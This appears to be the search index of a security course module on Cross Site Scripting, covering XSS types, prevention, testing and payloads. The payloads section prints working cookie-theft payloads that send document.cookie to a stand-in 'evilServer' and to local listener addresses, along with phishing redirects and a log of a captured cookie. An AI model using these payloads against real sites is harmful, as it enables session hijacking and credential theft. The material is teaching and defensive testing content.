{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Topic Introduction This week we will be looking Cross Site Scripting. This is another topic high in the OWASP top 10, and is still very relevant today. XSS is where an attacker is able to Inject Javascript (or other client side code) into a page. When a victim visits the page, the client side code executes in their browser. This can have a range of effects from minor irritation (popping an alert box), to full account takeover. It is my belief that regardless of filtering systems, or input sanitisation methods, XSS is going to be around for a long time. So much of the web relies on people being able to send / receive messages, that displaying user input will never go away (and thus the potential mistakes in sanitising it remain)","title":"Home"},{"location":"#topic-introduction","text":"This week we will be looking Cross Site Scripting. This is another topic high in the OWASP top 10, and is still very relevant today. XSS is where an attacker is able to Inject Javascript (or other client side code) into a page. When a victim visits the page, the client side code executes in their browser. This can have a range of effects from minor irritation (popping an alert box), to full account takeover. It is my belief that regardless of filtering systems, or input sanitisation methods, XSS is going to be around for a long time. So much of the web relies on people being able to send / receive messages, that displaying user input will never go away (and thus the potential mistakes in sanitising it remain)","title":"Topic Introduction"},{"location":"8_XSS/","text":"Topic Introduction This week we will be looking Cross Site Scripting. This is another topic high in the OWASP top 10, and is still very relevant today. XSS is where an attacker is able to Inject Javascript (or other client side code) into a page. When a victim visits the page, the client side code executes in their browser. This can have a range of effects from minor irritation (popping an alert box), to full account takeover. It is my belief that regardless of filtering systems, or input sanitisation methods, XSS is going to be around for a long time. So much of the web relies on people being able to send / receive messages, that displaying user input will never go away (and thus the potential mistakes in sanitising it remain)","title":"Cross Site Scripting"},{"location":"8_XSS/#topic-introduction","text":"This week we will be looking Cross Site Scripting. This is another topic high in the OWASP top 10, and is still very relevant today. XSS is where an attacker is able to Inject Javascript (or other client side code) into a page. When a victim visits the page, the client side code executes in their browser. This can have a range of effects from minor irritation (popping an alert box), to full account takeover. It is my belief that regardless of filtering systems, or input sanitisation methods, XSS is going to be around for a long time. So much of the web relies on people being able to send / receive messages, that displaying user input will never go away (and thus the potential mistakes in sanitising it remain)","title":"Topic Introduction"},{"location":"8_XSS/TypesOfXss/","text":"Types of XSS There are three main types of XSS: reflected, stored and DOM (Document Object Model) manipulation. We will focus on the Reflected and Stored versions, as the DOM based approach can be seen as an extension of them. Reflected XSS Traditionally thought of as the 'least dangerous' of XSS style attacks, here the malicious code is part of the victim's request to the website. While thought of as 'less dangerous', that is not always the case. Inputs to databases are often sanitised, meaning it can be harder to get a stored XSS attack past the defences. On the other hand, reflected attacks will tend to crop up in debugging/user information, and are only visible to the user who sent the request. This means that to perform a successful reflected XSS we would need some social engineering to get the victim to follow the link, but the potential impact is still high. Example Consider the XSS Example from before. We know the form takes a GET request, then echoes it's value back to the user. Consider what would happen if we could trick the user into clicking the following URL. ../reflected_xss_get.php/?forminput=<script>alert(\"Pwnd\");</script> For even more fun consider the following, sent as part of an email or IM: http://172.18.0.1/reflected_xss_get.php/?forminput= < script > alert ( \"Pwnd\" );</ script > Thus (with a bit of luck) we can get code to be executed on the Victim's machine through a URL. Note Even \"Better\" we could stash some form of redirection payload in what looks like a legitmate URL, for use in a Phishing attempt For Example as A Nice Safe Link ; ) in the email system. Stored XSS The \"Classic\" XSS. In this case the malicious code is stored on the website server itself. Consider the a simple message board, where posts are not sanitised. If the user submits a message containing malicious JS, this will be executed for every user who visits the page. This is certainly the type of thing we should be on the lookout for. Any user specified data that is stored, then displayed should be examined, and filtered. Overall this is a more dangerous style of attack, as it can target a wide range of users without us having to put in much effort. However, it is 'rarer' in the wild, mostly because people are paying more attention to the dangers of XSS here. Example In a forum or post based system, we could create a new post with the contents Evil Post <script>alert(\"hacked\")</script> If this is not sanitised before being stored or displayed. Any use who views this message will trigger the payload. Dom Based XSS Is where we can inject elements into the Document Object Model (DOM) of a website. These are typically a reflected style of XSS, but can be also be stored (for examine by setting user preferences). DOM based XSS, abuses JavaScript functions such as the document.* methods. Where information about the current page is read and written. Usually, DOM based XSS will use some form of server query (the result of a GET or POST) request to change the output on the page. This happens in much the same way as a reflected XSS attack. However, another common method is to take advantage of hash fragments , these are elements of the URL separated by a hash token. For example 8_Web_XSS/TypesOfXss/#dom-based-xss . These are often used for internal navigation between anchors on the page. But WILL not be sent to the server for processing. This means that we cannot rely on any server based filtering and detection. Example Consider a page that uses javascript to show the current URL <script> document.write(\"<p> Current URL is: \" + document.baseURI + \" </p>\") </script> Using the URL www.evil.org/page#<script>alert(\"hacked\")</script> Will trigger the XSS vulnerablity. Preventing DOM based attacks can be harder, as we may not be able to rely on the server side input sanitisation. Instead we need to focus on the methods used to write data using JavaScript. Functions that are unsafe include: document.write element.innerHTML However, functions like element.textContent or element.innerText are likely to be safe, as they are designed to deal with text, and filter HTML data. Summary In this article we have had an overview of different \"types\" of XSS. This can give us some idea of where the issue may occur in our programs. While the most \"Famous\" (and arguably the most dangerous) is the stored XSS attack. Both reflected and DOM based attacks can also cause loss of information. In the next article we will look at types of XSS Payloads, and see examples of How and attacker can use it.","title":"Types of XSS"},{"location":"8_XSS/TypesOfXss/#types-of-xss","text":"There are three main types of XSS: reflected, stored and DOM (Document Object Model) manipulation. We will focus on the Reflected and Stored versions, as the DOM based approach can be seen as an extension of them.","title":"Types of XSS"},{"location":"8_XSS/TypesOfXss/#reflected-xss","text":"Traditionally thought of as the 'least dangerous' of XSS style attacks, here the malicious code is part of the victim's request to the website. While thought of as 'less dangerous', that is not always the case. Inputs to databases are often sanitised, meaning it can be harder to get a stored XSS attack past the defences. On the other hand, reflected attacks will tend to crop up in debugging/user information, and are only visible to the user who sent the request. This means that to perform a successful reflected XSS we would need some social engineering to get the victim to follow the link, but the potential impact is still high. Example Consider the XSS Example from before. We know the form takes a GET request, then echoes it's value back to the user. Consider what would happen if we could trick the user into clicking the following URL. ../reflected_xss_get.php/?forminput=<script>alert(\"Pwnd\");</script> For even more fun consider the following, sent as part of an email or IM: http://172.18.0.1/reflected_xss_get.php/?forminput= < script > alert ( \"Pwnd\" );</ script > Thus (with a bit of luck) we can get code to be executed on the Victim's machine through a URL. Note Even \"Better\" we could stash some form of redirection payload in what looks like a legitmate URL, for use in a Phishing attempt For Example as A Nice Safe Link ; ) in the email system.","title":"Reflected XSS"},{"location":"8_XSS/TypesOfXss/#stored-xss","text":"The \"Classic\" XSS. In this case the malicious code is stored on the website server itself. Consider the a simple message board, where posts are not sanitised. If the user submits a message containing malicious JS, this will be executed for every user who visits the page. This is certainly the type of thing we should be on the lookout for. Any user specified data that is stored, then displayed should be examined, and filtered. Overall this is a more dangerous style of attack, as it can target a wide range of users without us having to put in much effort. However, it is 'rarer' in the wild, mostly because people are paying more attention to the dangers of XSS here. Example In a forum or post based system, we could create a new post with the contents Evil Post <script>alert(\"hacked\")</script> If this is not sanitised before being stored or displayed. Any use who views this message will trigger the payload.","title":"Stored XSS"},{"location":"8_XSS/TypesOfXss/#dom-based-xss","text":"Is where we can inject elements into the Document Object Model (DOM) of a website. These are typically a reflected style of XSS, but can be also be stored (for examine by setting user preferences). DOM based XSS, abuses JavaScript functions such as the document.* methods. Where information about the current page is read and written. Usually, DOM based XSS will use some form of server query (the result of a GET or POST) request to change the output on the page. This happens in much the same way as a reflected XSS attack. However, another common method is to take advantage of hash fragments , these are elements of the URL separated by a hash token. For example 8_Web_XSS/TypesOfXss/#dom-based-xss . These are often used for internal navigation between anchors on the page. But WILL not be sent to the server for processing. This means that we cannot rely on any server based filtering and detection. Example Consider a page that uses javascript to show the current URL <script> document.write(\"<p> Current URL is: \" + document.baseURI + \" </p>\") </script> Using the URL www.evil.org/page#<script>alert(\"hacked\")</script> Will trigger the XSS vulnerablity. Preventing DOM based attacks can be harder, as we may not be able to rely on the server side input sanitisation. Instead we need to focus on the methods used to write data using JavaScript. Functions that are unsafe include: document.write element.innerHTML However, functions like element.textContent or element.innerText are likely to be safe, as they are designed to deal with text, and filter HTML data.","title":"Dom Based XSS"},{"location":"8_XSS/TypesOfXss/#summary","text":"In this article we have had an overview of different \"types\" of XSS. This can give us some idea of where the issue may occur in our programs. While the most \"Famous\" (and arguably the most dangerous) is the stored XSS attack. Both reflected and DOM based attacks can also cause loss of information. In the next article we will look at types of XSS Payloads, and see examples of How and attacker can use it.","title":"Summary"},{"location":"8_XSS/XSS_Intro/","text":"Cross Site Scripting (XSS) Cross Site Scripting (XSS) is an attack where a malicious attacker injects executable code (often JavaScript) into another user's browser. Rather than target the victim, the attack exploits a vulnerability in the website that is visited, using this to deliver the malicious JS. To the victim, the JS appears to be a legitimate part of the website, and therefore should be executed without the site owner's (or victim's) knowledge. How it works Malicious JS is injected into one of the pages on a website, which implies that the site will accept (and include) user input in its pages. Again this goes back to Rule #1 of Web Development (don't trust user input). If the page performs inadequate sanitisation on the input, the data inserted by the attacker will be executed by the victim's browser. As an example, consider the following PHP page, that relays data input in a form: <html> <?php echo \"<p>Form input was \" . $_GET [ \"input\" ] . \"</p>\" ?> </html> The code assumes that the user will only input text. So if the user input was Hello world the output would be: < html > < p > Form input was Hello World </ p > </ html > However, if the user inputs JavaScript such as <script>alert();</script> the output becomes: < html > < p > Form input was < script > alert ()</ script ></ p > </ html > When the Page is loaded by the browser the code contained between the script tags will execute. Task If you start up web trainer (This is under week SQL) You can try getting the payload to fire, in the reflected xss example There are two things you should note when considering XSS: When testing for XSS, we will tend to use alerts as out payload. They are non-malicious (although irritating), and will cause a pop-up to be displayed making it clear when an attack has succeeded. Chrome and Internet Explorer have some forms of XSS detection built in, depending on the web development framework used there is an option to enable this using the HTTP header X-XSS-Protection: 0 Warning Do not assume this will always work, there are workarounds (and not all browsers are equal) So what can the Bad Guys do with it? Things like (but not exclusively limited to) - Session Jacking - Key Logging - Phishing While executing JS in someone's browser may not seem that bad (for example, it is hard to get hold of files on the remote system using JS) there are other options that can take place outside of the browser. JS may have access to Cookie Data JS can send HTTP requests to other parts of the web JS can modify the HTML of the current page using the DOM Again, while these may not directly lead to loss of data, it is possible to steal credentials (then log in as another user) to escalate the attack. Info Also... Google \"JavaScript Bitcoin Miner\" for an idea of the current trends in XSS payloads. Preventing XSS Our main way of avoiding XSS is to NEVER TRUST USER INPUT Looking a bit deeper we have the following rules: Filter input when you receive it. Data that we receive (or store) should be filtered for potential issues. However depending on the application functionality we may have some limits here. While restricting all character formatting can help prevent XSS, it also reduces the user experience (For example, only allowing bold , italic or Emojis for formatting) Encode data on output The flip side of Filtering. We can also encode data when we display it. This will convert common HTML Tags to a \"web safe\" version. (For example < becomes %68 , meaning it will be displayed correctly by the browser, but not identified as HTML code) Again, what we allow here can be limited by the desired functionality. Apply Browser based prevention Turning on options like Content Security Policy (CSP) can help. However YMMV depending on browser implementation. Disallow parsing for pages that shouldn't be HTML. We can also set the \"Content-type\" of our pages, to match the expected output. For example, in API's we can set the type to \"text/json\" (or similar) to avoid possible XSS issues. So while the answer is easy, make sure we sanitise all user input. However, this can be a lot harder than it sounds. Given that way the web deals with data driven applications, there is a lot of work needed to identify where this data may be. Note Also Input sanitisation is Hard. If you want to practice methods of avoiding common input sanitisation, I would recommend running through the examples at web for pentester Filtering #filtering We all like to code in different languages. So I am going to avoid making recommendations on filtering approaches. For a development language of your choice, research filtering options. - What is available in the language? - Are there known limitations? Comment in the Feed using the tag #filtering on your findings Note If you are stuck for ideas, you may want to take a look at the following Pythons html functions. The Jinja Template Language HTML Escape Functions Identifying areas where XSS may occur. The first stage of finding potential XSS is the code audit . Here we look through the code, identifying: areas where the user supplies data. Areas where user supplied data is displayed. This can include (but is not limited to): Usernames / Emails \"Posts\" by users \"Messaging\" between users Important Remember that the user has full control over the data being sent. You may think that the client side email address checks will stop non email inputs. But its easy to bypass these checks. Don't just consider the \"standard\" front end functionality. While its obvious that we should pay a bit more attention to this. We should, consider other areas where user information might be displayed. For example admin screens showing other user data (for example user-agent / browser, PII) We should then check the data-flow for this submitted data, and ask: Is the user input sanitised? - If not, WHY not? When does the sanitisation happen: - Before the data is stored - Before the data is displayed (In this case we need to check EVERY time the data is displayed) How does this sanitisation happen: Is it a library, check for known exploits Have we rolled our own sanitisation? Can we be sure It works. Testing For XSS Important Perhaps it would be better calling this \"Testing our Sanitisation Works Correctly\" Once we have identified areas where XSS may occur, We need to check all of the areas we have identified. We can have two strategies for testing for XSS. Either manual testing or automated testing. Manual Testing Here we can go through each input and test it against a list of possible XSS style strings. For example, in a simple case we could just try the classic <script>alert(\"XSS DEMO\")</script> in every text entry box. However, as we should be sanitising our data, hopefully a simple alert box payload wont show up. So we need to think of more imaginative ways of working around the problem. Push the filters that are used. If its a library, we should be able to get some idea of the types of input that are accepted. If we are using our own forms of sanitisation, then again we can test they behave as expected. Important This is also where our insight into the code base will help us. We know the types of sanitisation that we are using. We should also have full knowledge of the frameworks etc. So we should be able to target the testing. Note Subject to the usual unit-testing \"We Only Test what we expect\" issues. When it comes to testing manually, we can also take a leaf out of the automated testing book. There are some excellent lists of XSS payloads out there For Example Those in SecLists That we can use to check for XSS. Note Again Pay attention to the frameworks you are using. If we are using things like Markdown to allow users to format text, then it would pay to look at Markdown specific payloads. Automated Testing While the lists of payloads in places like SecLists are great, and can help us check against the more common forms of XSS. There are a lot of them, and it can be a PITA to type them all in. We can use tools Like Burp Suite to automate testing for XSS. Running through payload lists (for example those from SecLists), automatically As tools are up to personal preference: I have included some example tutorials if you are interested. Official Burp XSS Tutorial Another Tutorial on XSS with Burp XSSer tool in Kali XSStrike Important Again remember that automated scanning needs some human intelligence applied. While it can help us run through lots of potential payloads, we still should apply some thinking to the results. Summary In this article we have had our introduction to Cross Site Scripting (XSS). We have looked at what it is, why it occurs, and highlighted some methods for preventing (and detecting) it in our code Task Using the Web Trainer (In the Github under SQL injection), try to trigger an alert box. Try one of the automated tools described above to trigger the payload. Further Reading OWASP XSS Prevention Cheat sheet","title":"What is XSS"},{"location":"8_XSS/XSS_Intro/#cross-site-scripting-xss","text":"Cross Site Scripting (XSS) is an attack where a malicious attacker injects executable code (often JavaScript) into another user's browser. Rather than target the victim, the attack exploits a vulnerability in the website that is visited, using this to deliver the malicious JS. To the victim, the JS appears to be a legitimate part of the website, and therefore should be executed without the site owner's (or victim's) knowledge.","title":"Cross Site Scripting (XSS)"},{"location":"8_XSS/XSS_Intro/#how-it-works","text":"Malicious JS is injected into one of the pages on a website, which implies that the site will accept (and include) user input in its pages. Again this goes back to Rule #1 of Web Development (don't trust user input). If the page performs inadequate sanitisation on the input, the data inserted by the attacker will be executed by the victim's browser. As an example, consider the following PHP page, that relays data input in a form: <html> <?php echo \"<p>Form input was \" . $_GET [ \"input\" ] . \"</p>\" ?> </html> The code assumes that the user will only input text. So if the user input was Hello world the output would be: < html > < p > Form input was Hello World </ p > </ html > However, if the user inputs JavaScript such as <script>alert();</script> the output becomes: < html > < p > Form input was < script > alert ()</ script ></ p > </ html > When the Page is loaded by the browser the code contained between the script tags will execute. Task If you start up web trainer (This is under week SQL) You can try getting the payload to fire, in the reflected xss example There are two things you should note when considering XSS: When testing for XSS, we will tend to use alerts as out payload. They are non-malicious (although irritating), and will cause a pop-up to be displayed making it clear when an attack has succeeded. Chrome and Internet Explorer have some forms of XSS detection built in, depending on the web development framework used there is an option to enable this using the HTTP header X-XSS-Protection: 0 Warning Do not assume this will always work, there are workarounds (and not all browsers are equal)","title":"How it works"},{"location":"8_XSS/XSS_Intro/#so-what-can-the-bad-guys-do-with-it","text":"Things like (but not exclusively limited to) - Session Jacking - Key Logging - Phishing While executing JS in someone's browser may not seem that bad (for example, it is hard to get hold of files on the remote system using JS) there are other options that can take place outside of the browser. JS may have access to Cookie Data JS can send HTTP requests to other parts of the web JS can modify the HTML of the current page using the DOM Again, while these may not directly lead to loss of data, it is possible to steal credentials (then log in as another user) to escalate the attack. Info Also... Google \"JavaScript Bitcoin Miner\" for an idea of the current trends in XSS payloads.","title":"So what can the Bad Guys do with it?"},{"location":"8_XSS/XSS_Intro/#preventing-xss","text":"Our main way of avoiding XSS is to NEVER TRUST USER INPUT Looking a bit deeper we have the following rules: Filter input when you receive it. Data that we receive (or store) should be filtered for potential issues. However depending on the application functionality we may have some limits here. While restricting all character formatting can help prevent XSS, it also reduces the user experience (For example, only allowing bold , italic or Emojis for formatting) Encode data on output The flip side of Filtering. We can also encode data when we display it. This will convert common HTML Tags to a \"web safe\" version. (For example < becomes %68 , meaning it will be displayed correctly by the browser, but not identified as HTML code) Again, what we allow here can be limited by the desired functionality. Apply Browser based prevention Turning on options like Content Security Policy (CSP) can help. However YMMV depending on browser implementation. Disallow parsing for pages that shouldn't be HTML. We can also set the \"Content-type\" of our pages, to match the expected output. For example, in API's we can set the type to \"text/json\" (or similar) to avoid possible XSS issues. So while the answer is easy, make sure we sanitise all user input. However, this can be a lot harder than it sounds. Given that way the web deals with data driven applications, there is a lot of work needed to identify where this data may be. Note Also Input sanitisation is Hard. If you want to practice methods of avoiding common input sanitisation, I would recommend running through the examples at web for pentester Filtering #filtering We all like to code in different languages. So I am going to avoid making recommendations on filtering approaches. For a development language of your choice, research filtering options. - What is available in the language? - Are there known limitations? Comment in the Feed using the tag #filtering on your findings Note If you are stuck for ideas, you may want to take a look at the following Pythons html functions. The Jinja Template Language HTML Escape Functions","title":"Preventing XSS"},{"location":"8_XSS/XSS_Intro/#identifying-areas-where-xss-may-occur","text":"The first stage of finding potential XSS is the code audit . Here we look through the code, identifying: areas where the user supplies data. Areas where user supplied data is displayed. This can include (but is not limited to): Usernames / Emails \"Posts\" by users \"Messaging\" between users Important Remember that the user has full control over the data being sent. You may think that the client side email address checks will stop non email inputs. But its easy to bypass these checks. Don't just consider the \"standard\" front end functionality. While its obvious that we should pay a bit more attention to this. We should, consider other areas where user information might be displayed. For example admin screens showing other user data (for example user-agent / browser, PII) We should then check the data-flow for this submitted data, and ask: Is the user input sanitised? - If not, WHY not? When does the sanitisation happen: - Before the data is stored - Before the data is displayed (In this case we need to check EVERY time the data is displayed) How does this sanitisation happen: Is it a library, check for known exploits Have we rolled our own sanitisation? Can we be sure It works.","title":"Identifying areas where XSS may occur."},{"location":"8_XSS/XSS_Intro/#testing-for-xss","text":"Important Perhaps it would be better calling this \"Testing our Sanitisation Works Correctly\" Once we have identified areas where XSS may occur, We need to check all of the areas we have identified. We can have two strategies for testing for XSS. Either manual testing or automated testing.","title":"Testing For XSS"},{"location":"8_XSS/XSS_Intro/#manual-testing","text":"Here we can go through each input and test it against a list of possible XSS style strings. For example, in a simple case we could just try the classic <script>alert(\"XSS DEMO\")</script> in every text entry box. However, as we should be sanitising our data, hopefully a simple alert box payload wont show up. So we need to think of more imaginative ways of working around the problem. Push the filters that are used. If its a library, we should be able to get some idea of the types of input that are accepted. If we are using our own forms of sanitisation, then again we can test they behave as expected. Important This is also where our insight into the code base will help us. We know the types of sanitisation that we are using. We should also have full knowledge of the frameworks etc. So we should be able to target the testing. Note Subject to the usual unit-testing \"We Only Test what we expect\" issues. When it comes to testing manually, we can also take a leaf out of the automated testing book. There are some excellent lists of XSS payloads out there For Example Those in SecLists That we can use to check for XSS. Note Again Pay attention to the frameworks you are using. If we are using things like Markdown to allow users to format text, then it would pay to look at Markdown specific payloads.","title":"Manual Testing"},{"location":"8_XSS/XSS_Intro/#automated-testing","text":"While the lists of payloads in places like SecLists are great, and can help us check against the more common forms of XSS. There are a lot of them, and it can be a PITA to type them all in. We can use tools Like Burp Suite to automate testing for XSS. Running through payload lists (for example those from SecLists), automatically As tools are up to personal preference: I have included some example tutorials if you are interested. Official Burp XSS Tutorial Another Tutorial on XSS with Burp XSSer tool in Kali XSStrike Important Again remember that automated scanning needs some human intelligence applied. While it can help us run through lots of potential payloads, we still should apply some thinking to the results.","title":"Automated Testing"},{"location":"8_XSS/XSS_Intro/#summary","text":"In this article we have had our introduction to Cross Site Scripting (XSS). We have looked at what it is, why it occurs, and highlighted some methods for preventing (and detecting) it in our code Task Using the Web Trainer (In the Github under SQL injection), try to trigger an alert box. Try one of the automated tools described above to trigger the payload.","title":"Summary"},{"location":"8_XSS/XSS_Intro/#further-reading","text":"OWASP XSS Prevention Cheat sheet","title":"Further Reading"},{"location":"8_XSS/XSS_Payloads/","text":"Common XSS 'injections' So, you have found XSS and made an 'alert()' box pop up. Congratulations. What can we do next? In this article we will look at some of the common XSS Based attacks Window Relocation Scraping User Information. Info For the examples, I have linked scripts directly to the `onClick method of the buttons (otherwise they would trigger automatically) <button onclick=\"PAYLOAD\"> Window Relocation For a Phishing style attack we can redirect the current page to elsewhere (for example, a page that looks much like the login page). This may enable us to seize user credentials. This would use the payload: < script > window . location = \" http : //127.0.0.1:8000/</script> To redirect the user to another page that is under our control. A common use of this is to create an evil version of the sites login page, to harvest user credentials before redirecting back to the intended content. You can see an example of this by clicking the button below Click Me to go home Manipulating Browser Behaviour As the JavaScript has access to almost anything in the browsers current session, It is also possible to start grabbing data from, or manipulating the behaviour of the browser itself. For example we can use the following to show the users current set of cookies <script>alert(document.cookie)</script> Click Me for Cookies Or use a payload like this to grab some elements of HTML local storage using <script>alert(localStorage.key(0) + \" \" + localStorage.getItem(localStorage.key(0)))</script> Click Me for Storage Redirected Session Jacking Putting these elements (redirection, and leaking browser information) together gives us another payload. Rather than use an \"alert()\" as a payload. We can use XSS to grab another user's session details, then redirect to a target page that gathers the details. This relies on us using the JavaScript to make a request to another site (one that we own) and appending the session cookie. Our basic POC (Proof Of Concept Exploit) would make use of the following: < script > window . location = \"http://evilServer/?cookie=\" + document . cookie < /script> In this case we also need a server available to listen for the connection. For testing I like to use a locally hosted server, for example using the one built in to python #For Python 2 python -m SimpleHTTPServer #For Python 3 python -m http.server This means our payload becomes < script > window . location = \"http://127.0.0.1:8000/evil.php?cookie=\" + document . cookie < /script> Note Remember to use the port your server is listening on. kali@kali:~$ python3 -m http.server Serving HTTP on 0 .0.0.0 port 8000 ( http://0.0.0.0:8000/ ) ... 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] code 404 , message File not found 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] \"GET /cookie.php?_ga=GA1.1.1899681705.1601546157;%20_hjid=304c63fa-2fd3-4940-9803-d380302c7b07 HTTP/1.1\" 404 - 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] code 404 , message File not found 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] \"GET /favicon.ico HTTP/1.1\" 404 - We can pick out the PHPSESSID cookie, and hijack someone else's session by changing the cookie settings in our browser. More Subtle session jacking While a redirect gets us the information we want, having your victims browser hang, or give us a 404 is not very subtle. Instead we could take a couple of alternative approaches: Have a web server show an \"error\" page. When the user hits the back button (or if we are really cunning hits the link we supply from the 'referer' part of the request) they go back to the main page, hopefully oblivious. Get the JS to request the page as part of another object (IE an image). This will then be rendered invisibly (or at worst as an error in the console) on the original page. One approach to this is to use an image (or similar) as the payload new Image().src=\"http://192.168.3.1:8000/evil.php?output=\"+document.cookie; our listener then will then pick up the cookie, and we can again steal their session. You can try this out by starting a python web server, and clicking the button below Important Check my script, to be sure the address is local. Always a good idea to check the source when someone offers to show you a \"cool hacking trick\" Send My cookies Remotely Task In the Expliot Trainer Try the Reflected XSS Examples. See if you can send using XSS. Alternatives to script tags There are several options rather than using <script> tags. These will use the similar payloads to the scripting version. Useful ones include. What Payload onload (happens when the page loads) \\<body onload=(alert();) Mouse events \\<tag onmouseover=alert()...\\</tag> Errors \\<img src=\\\"url that does not exist\\\", onerror=alert()> Task Try getting an XSS payload to fire. See if you can grab a session token in using the web trainer Also Try some of the more interesting XSS scripts below. Further reading For an Excellent (and somewhat scary) Resource on Payloads see XSSPayloads.com For information on XSS in other template languages (Not just PHP) Exploiting XSS Via Markdown","title":"XSS_Payloads"},{"location":"8_XSS/XSS_Payloads/#common-xss-injections","text":"So, you have found XSS and made an 'alert()' box pop up. Congratulations. What can we do next? In this article we will look at some of the common XSS Based attacks Window Relocation Scraping User Information. Info For the examples, I have linked scripts directly to the `onClick method of the buttons (otherwise they would trigger automatically) <button onclick=\"PAYLOAD\">","title":"Common XSS 'injections'"},{"location":"8_XSS/XSS_Payloads/#window-relocation","text":"For a Phishing style attack we can redirect the current page to elsewhere (for example, a page that looks much like the login page). This may enable us to seize user credentials. This would use the payload: < script > window . location = \" http : //127.0.0.1:8000/</script> To redirect the user to another page that is under our control. A common use of this is to create an evil version of the sites login page, to harvest user credentials before redirecting back to the intended content. You can see an example of this by clicking the button below Click Me to go home","title":"Window Relocation"},{"location":"8_XSS/XSS_Payloads/#manipulating-browser-behaviour","text":"As the JavaScript has access to almost anything in the browsers current session, It is also possible to start grabbing data from, or manipulating the behaviour of the browser itself. For example we can use the following to show the users current set of cookies <script>alert(document.cookie)</script> Click Me for Cookies Or use a payload like this to grab some elements of HTML local storage using <script>alert(localStorage.key(0) + \" \" + localStorage.getItem(localStorage.key(0)))</script> Click Me for Storage","title":"Manipulating Browser Behaviour"},{"location":"8_XSS/XSS_Payloads/#redirected-session-jacking","text":"Putting these elements (redirection, and leaking browser information) together gives us another payload. Rather than use an \"alert()\" as a payload. We can use XSS to grab another user's session details, then redirect to a target page that gathers the details. This relies on us using the JavaScript to make a request to another site (one that we own) and appending the session cookie. Our basic POC (Proof Of Concept Exploit) would make use of the following: < script > window . location = \"http://evilServer/?cookie=\" + document . cookie < /script> In this case we also need a server available to listen for the connection. For testing I like to use a locally hosted server, for example using the one built in to python #For Python 2 python -m SimpleHTTPServer #For Python 3 python -m http.server This means our payload becomes < script > window . location = \"http://127.0.0.1:8000/evil.php?cookie=\" + document . cookie < /script> Note Remember to use the port your server is listening on. kali@kali:~$ python3 -m http.server Serving HTTP on 0 .0.0.0 port 8000 ( http://0.0.0.0:8000/ ) ... 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] code 404 , message File not found 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] \"GET /cookie.php?_ga=GA1.1.1899681705.1601546157;%20_hjid=304c63fa-2fd3-4940-9803-d380302c7b07 HTTP/1.1\" 404 - 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] code 404 , message File not found 127 .0.0.1 - - [ 01 /Nov/2020 16 :08:42 ] \"GET /favicon.ico HTTP/1.1\" 404 - We can pick out the PHPSESSID cookie, and hijack someone else's session by changing the cookie settings in our browser.","title":"Redirected Session Jacking"},{"location":"8_XSS/XSS_Payloads/#more-subtle-session-jacking","text":"While a redirect gets us the information we want, having your victims browser hang, or give us a 404 is not very subtle. Instead we could take a couple of alternative approaches: Have a web server show an \"error\" page. When the user hits the back button (or if we are really cunning hits the link we supply from the 'referer' part of the request) they go back to the main page, hopefully oblivious. Get the JS to request the page as part of another object (IE an image). This will then be rendered invisibly (or at worst as an error in the console) on the original page. One approach to this is to use an image (or similar) as the payload new Image().src=\"http://192.168.3.1:8000/evil.php?output=\"+document.cookie; our listener then will then pick up the cookie, and we can again steal their session. You can try this out by starting a python web server, and clicking the button below Important Check my script, to be sure the address is local. Always a good idea to check the source when someone offers to show you a \"cool hacking trick\" Send My cookies Remotely Task In the Expliot Trainer Try the Reflected XSS Examples. See if you can send using XSS.","title":"More Subtle session jacking"},{"location":"8_XSS/XSS_Payloads/#alternatives-to-script-tags","text":"There are several options rather than using <script> tags. These will use the similar payloads to the scripting version. Useful ones include. What Payload onload (happens when the page loads) \\<body onload=(alert();) Mouse events \\<tag onmouseover=alert()...\\</tag> Errors \\<img src=\\\"url that does not exist\\\", onerror=alert()> Task Try getting an XSS payload to fire. See if you can grab a session token in using the web trainer Also Try some of the more interesting XSS scripts below.","title":"Alternatives to script tags"},{"location":"8_XSS/XSS_Payloads/#further-reading","text":"For an Excellent (and somewhat scary) Resource on Payloads see XSSPayloads.com For information on XSS in other template languages (Not just PHP) Exploiting XSS Via Markdown","title":"Further reading"},{"location":"8_XSS/videos/","text":"Reflected XSS Stored XSS XSS in Attributes Session Jacking Intro to Filter Trainer","title":"XSS Videos"},{"location":"8_XSS/videos/#reflected-xss","text":"","title":"Reflected XSS"},{"location":"8_XSS/videos/#stored-xss","text":"","title":"Stored XSS"},{"location":"8_XSS/videos/#xss-in-attributes","text":"","title":"XSS in Attributes"},{"location":"8_XSS/videos/#session-jacking","text":"","title":"Session Jacking"},{"location":"8_XSS/videos/#intro-to-filter-trainer","text":"","title":"Intro to Filter Trainer"}]}